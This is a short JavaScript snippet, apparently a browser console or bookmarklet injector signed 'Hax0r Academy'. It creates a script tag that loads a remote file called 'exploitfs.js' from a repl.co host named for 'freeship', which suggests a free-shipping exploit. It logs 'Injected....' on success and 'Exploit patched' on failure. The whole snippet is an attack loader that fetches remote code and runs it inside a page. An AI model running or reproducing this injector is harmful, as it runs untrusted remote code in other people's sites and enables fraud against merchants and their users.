const script = document.createElement("script");

script.setAttribute(
"src",
"https://freeship.younesbravodka.repl.co/exploitfs.js"
);
script.setAttribute("async","");

script.onload = function handleInject(){
	console.log('Injected....');

	alert('Edit By Hax0r Academy 3:) !');
};

script.onerror = function handleError(){
	console.log('Exploit patched :(');
};

document.body.appendChild(script);